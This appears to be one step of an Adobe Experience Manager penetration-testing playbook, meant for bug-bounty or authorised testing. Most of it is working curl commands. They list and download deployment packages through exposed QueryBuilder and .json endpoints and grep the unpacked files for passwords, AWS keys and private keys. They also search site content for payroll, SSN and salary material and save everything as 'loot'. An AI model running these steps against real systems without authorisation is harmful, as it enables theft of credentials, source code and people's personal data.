# Batch 08 — Packages + content secret mining

## objective

Turn QueryBuilder/json leads into **files on disk**: deployment packages and sensitive DAM/content objects. Grep offline for secrets.

## estimated_time

60–120 minutes

## prerequisites

- Batch 07 notes (paths that looked interesting)
- `QB` and/or working `.json` dump URL
- Place to store loot **outside git**

## testing_workflow

### 1) Technique A — list packages

```bash
T="https://TARGET"
QB="$T/..."   # your working QB

curl -sk -G "$QB" \
  --data-urlencode "path=/etc/packages" \
  --data-urlencode "p.limit=100" -o packages-qb.json

curl -sk -o packages-1.json -w "%{http_code} %{size_download}\n" \
  "$T/etc/packages.1.json"
curl -sk -o packages-2.json -w "%{http_code} %{size_download}\n" \
  "$T/etc/packages.2.json"
```

Extract zip URLs/paths from JSON (manual or `jq` if available).

### 2) Technique B — download 1–3 candidate zips

```bash
mkdir -p ~/loot/aem-packages && cd ~/loot/aem-packages
# Example — replace with real path from listing
curl -sk -O "$T/etc/packages/my_packages/customer-all-1.0.zip"
ls -la
```

```bash
unzip -l customer-all-1.0.zip | head -40
unzip -o customer-all-1.0.zip -d customer-all
grep -RniE 'password|secret|api[_-]?key|jdbc:|AKIA|BEGIN (RSA |OPENSSH )?PRIVATE|private_key' customer-all \
  | head -60
```

### 3) Technique C — content/DAM mining (no zip required)

```bash
for term in confidential internal backup payroll ssn salary earnings "do not publish"; do
  echo "===== $term ====="
  curl -sk -G "$QB" \
    --data-urlencode "path=/content" \
    --data-urlencode "fulltext=$term" \
    --data-urlencode "p.limit=10" | head -c 300
  echo
done
```

Download any high-value asset URL you can resolve (PDF/XLS) into `~/loot/` only.

## decision_points

| If… | Then… |
|-----|--------|
| Secrets in package | Document impact; optional custom-selector hunt in source → later **10/11** |
| Packages blocked, content open | Report content disclosure; continue **09** |
| Nothing sensitive | Still record access level; go **09** for XSS track |

## expected_findings

- Source code disclosure, credentials, WAF/API keys, confidential docs (classic “packages heist” impact)

## next_batch_to_continue_with

→ **[09-xss-rawcontent.md](./09-xss-rawcontent.md)**  
If Forms flagged earlier → after 09–11 or parallel next session **[12-forms-surface.md](./12-forms-surface.md)**
